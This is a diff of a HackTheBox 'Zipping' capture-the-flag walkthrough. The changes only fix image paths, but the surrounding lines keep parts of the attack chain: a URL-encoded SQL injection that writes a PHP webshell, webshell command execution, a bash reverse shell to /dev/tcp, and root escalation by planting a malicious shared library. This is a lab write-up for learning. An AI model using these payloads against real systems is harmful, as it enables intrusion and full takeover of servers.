@@ -5,7 +5,7 @@ categories: HTB Machine
 tags: SQLI Binary_exploitation zip_symlink_abuse LFI
 ---
   
-![](../../../../images/2024-01-19-13-06-34.png)
+![](/images/zipping/2024-01-19-13-06-34.png)
 
 This machine the difficulty is medium by hackthebox.The creator for this box machine is [xdann1](https://app.hackthebox.com/users/535069) . So now i would give your walkthrough for this machine.I hope you enjoy : )
 
@@ -20,7 +20,7 @@ First of all check the open port using nmap
 
 
 
- ![](../../../../images/2024-01-19-13-13-38.png)
+ ![](/images/zipping/2024-01-19-13-13-38.png)
 
 
 
@@ -31,7 +31,7 @@ Only port 80 and 22 only open so nothing important here
 
 
  
- ![](../../../../images/2024-01-19-13-15-59.png)
+ ![](/images/zipping/2024-01-19-13-15-59.png)
  
 
 
@@ -51,7 +51,7 @@ Only port 80 and 22 only open so nothing important here
 
  `curl http://zipping.htb/uploads/2734449af42ebfe74df5f6865e2529cd/etc.pdf`
  
- ![](../../../../images/2024-01-19-13-42-57.png)
+ ![](/images/zipping/2024-01-19-13-42-57.png)
 
 &nbsp;
 
@@ -67,7 +67,7 @@ Only port 80 and 22 only open so nothing important here
 
 
 
- (![](../../../../images/2024-01-19-13-52-32.png)
+ (![](/images/zipping/2024-01-19-13-52-32.png)
 
 &nbsp;
 
@@ -138,7 +138,7 @@ Now Look at /shop as you can see there is a parameter `page=product` and `id=3` 
 
 
 
-![](../../../../images/2024-01-19-14-07-47.png)
+![](/images/zipping/2024-01-19-14-07-47.png)
 
 &nbsp; 
 &nbsp;
@@ -222,7 +222,7 @@ The first two tests behave as we would expect- 1 passes the filter and test does
 &nbsp;
 &nbsp;
 &nbsp;
-![](../../../../images/2024-01-19-15-26-40.png)
+![](/images/zipping/2024-01-19-15-26-40.png)
 
 Sqli shell worked !
 
@@ -238,7 +238,7 @@ so now i just need upload mywebshell to the website
 
 to upload the webshell go to `page=/var/lib/mysql/shel` without .php because already appended so you just see blank right?that mean its uploading so to access the webshell at /shop path because u can see the below
 
-![](../../../../images/2024-01-19-15-45-22.png)
+![](/images/zipping/2024-01-19-15-45-22.png)
 
 `http://zipping.htb/shop/rcea.php?cmd=ls` succeed rce so now we just revshell
 
@@ -249,14 +249,14 @@ so now create file bash for revshell
 bash -i >& /dev/tcp/10.10.14.20/1337 0>&1
 ```
 
-![](../../../../images/2024-01-19-15-50-37.png)
+![](/images/zipping/2024-01-19-15-50-37.png)
 
 &nbsp;
 
 <a id="item-four"></a>
 ## SQL Injection (Manual)
 
-![](../../../../images/2024-01-19-15-57-05.png)
+![](/images/zipping/2024-01-19-15-57-05.png)
 &nbsp;
 
 
@@ -270,7 +270,7 @@ Look at the time that means sqli time based so lets upload shell using into outf
 
 
 
-![](../../../../images/2024-01-19-16-09-07.png)
+![](/images/zipping/2024-01-19-16-09-07.png)
 
 
 i uploaded shell from sql injection and i got rce `%0A%0D';SELECT+'<%3fphp+system($_REQUEST["cmd"])%3b+%3f>'+INTO+OUTFILE+'/var/lib/mysql/sh.php'%3b+--+-0 ` here the payload url encoded
@@ -296,7 +296,7 @@ so we need read the code using strings command
 
 `strings /usr/bin/stock`
 
-![](../../../../images/2024-01-15-22-52-46.png)
+![](/images/zipping/2024-01-15-22-52-46.png)
 
 Here the password `St0ckM4nager`
 
@@ -306,7 +306,7 @@ now try login back and success but nothing here to exploit it so we need using s
 
 after that paste the password and enter then you will see at here "No such file"
 
-![](../../../../images/2024-01-15-22-54-02.png)
+![](/images/zipping/2024-01-15-22-54-02.png)
 
 ```
 openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
@@ -330,4 +330,4 @@ now run your netcat on your linux terminal and run `sudo /usr/bin/stock`
 
 And will get access root from the system because you added malicious file in libcounter.so file at .config because the binary `/usr/bin/stock` compile with this file libcounter.so and that's why this happened 
 
-![](../../../../images/2024-01-15-22-54-59.png)
+![](/images/zipping/2024-01-15-22-54-59.png)
